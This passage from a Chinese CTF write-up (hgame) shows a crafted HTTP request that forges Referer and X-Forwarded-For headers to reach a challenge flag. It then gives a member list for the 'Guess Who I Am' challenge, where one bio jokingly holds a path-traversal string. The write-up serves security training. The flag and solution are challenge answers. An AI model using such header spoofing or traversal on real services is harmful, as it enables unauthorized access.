</span>session=MTY3MjkzMTY3NXxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBZ0ItfEpkrqBezOGq9RBd9KmLkzyDgKVjXFwrAT9nHfmQOxAS; PHPSESSID=jpl68kvmg4r5ivdebfb84sa9k1; code=Vidar</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>55</span><br><span class="line"></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;luckytoday&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;happy123&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>得到<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;H0w_ArE_Y0u_T0day?&#125;</span><br></pre></td></tr></table></figure><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><p>源码提示<a href="https://github.com/Potat0000/Vidar-Website/edit/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/edit/master/src/scripts/config/member.js</a></p><p><code>database.json</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ba1van4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yolande&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 非常菜的密码手 / 很懒的摸鱼爱好者，有点呆，想学点别的但是一直开摆&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=rY328VIqDc7lNtujYic8JxA&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://y01and3.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;t0hka&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 日常自闭的Re手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=EYNwm1PQe8o5OcghFb4zfw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.t0hka.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;h4kuy4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 菜鸡pwn手 / 又菜又爱摆&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=BmACniaibVb6IL6LiaYF4Uvlw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://hakuya.work&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kabuto&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级web / cat../../../../f*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=oPn2ez6Nq12GqPZG6cV7nw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.bilibili.com/video/BV1GJ411x7h7/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;R1esbyfe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 爱好歪脖 / 究极咸鱼一条 / 热爱幻想 / 喜欢窥屏水群&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=FLyUHP6nYov19gA0ia83u8Q&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://r1esbyfe.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tr0uble&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 喜欢肝原神的密码手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=bgcib3gBjJGdKEf7BZ512Uw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://clingm.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Roam&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21级 / 入门级crypto&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=5wzr9TVyw2nxOz5Jb7ceaQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Potat0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / 摆烂网管 / DN42爱好者&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=NicTy1CDqeHsgzbZEIUU2wg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://potat0.cc/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Summer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / 歪脖手 / 想学运维 / 发呆业务爱好者&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=4y6zxTBSB3cbseeyPvQWng&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.m1dsummer.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chuj&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / 已退休不再参与大多数赛事 / 不好好学习，生活中就会多出许多魔法和奇迹&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=aM4tJSQSxB5gcauIMDEtUg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cjovi.icu&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4nsw3r&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级会长 / re / 不会pwn&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=j3LOiav9IluKSYg1VEibblZw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://4nsw3r.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4ctue&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / 可能是IOT的MISC手 / 可能是美工 / 废物晚期&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/4ctue.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0wl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / Re手 / 菜&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=06FRYslcuprt59OxibicdhqQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://0wl-alt.github.io&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;At0m&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / web / 想学iot&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/at0m.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://homeboyc.cn/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ChenMoFeiJin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / Crypto / 摸鱼学代师&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=5xyCaLib3lovjrUzf5pWxDQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://chenmofeijin.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Klrin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / WEB / 菜的抠脚 / 想学GO&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=nnzEWNwxMS88jKYre5fOjg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.mjclouds.com/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ek1ng&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / Web / 还在努力&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=pJFuHEqNaFk1If1STvRibWw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://ek1ng.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;latt1ce&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20级 / Crypto&amp;BlockChain / Plz V me 50 eth&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=EmPiaz7Msgg7iaia9tibibjdUyw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://lee-tc.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ac4ae0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*级 / 被拐卖来接盘的格子 / 不可以乱涂乱画哦&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=EI7A02PYs5WUVFP2bciad8w&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://twitter.com/LAttic1ng&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Akira&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 不会web / 半吊子运维 / 今天您漏油了吗&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=ku1vqyI1hLJr61PGIlic7Ow&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://4kr.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qz&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 摸鱼美工 / 学习图形学、渲染ing&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=q5qVDcvyzxee4qiays52mibA&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://fl0.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Liki4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 脖子笔直歪脖手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=E3j3BJrsAfyl1arfnFKufQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/Liki4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x4qE&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / &amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Web&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=K7icYial1VVzlNl7hrD9MlNw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/0x4qE&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xi4oyu&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 骨瘦如柴的胖手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=JfeMY6Lz5ZU4GmtTV85otQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.xi4oyu.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;R3n0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / bin底层选手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=icY08gnMlXtoYIJ9ib3eJQ2g&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://r3n0.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;m140&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 不会re / dl萌新 / 太弱小了，没有力量 / 想学游戏&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=zt0iccbnGuV8dOpXIYrJgvg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mezone&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 普通的binary爱好者。&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=rDD29iahzzg8AvQX7fdbFPg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d1gg12&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 游戏开发 / 🐟粉&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=icawQKtjLcRiaj7scTRBZ9Qw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://d1g.club&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Trotsky&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 半个全栈 / 安卓摸🐟 / P 社玩家 / 🍆粉&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=LiasEshjTXTrNzJjPHVY3Vw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://altonhe.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Gamison&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / 挖坑不填的web选手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=0VaAu2go9mvrMXu1ibmKy1g&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://aw.gamison.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tinmix&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级会长 / DL爱好者 / web苦手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=L2EclrAltb7lk3LBPY6oWA&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://poi.ac&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;19级 / Re手，我手呢？&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=p1TD1qwKfEK8NZExRDqic1A&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://wr-web.github.io&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wenzhuan&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / 完全不会安全 / 一个做设计的鸽子美工 / 天天画表情包&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/wenzhuan.jpg&quot;</span><span 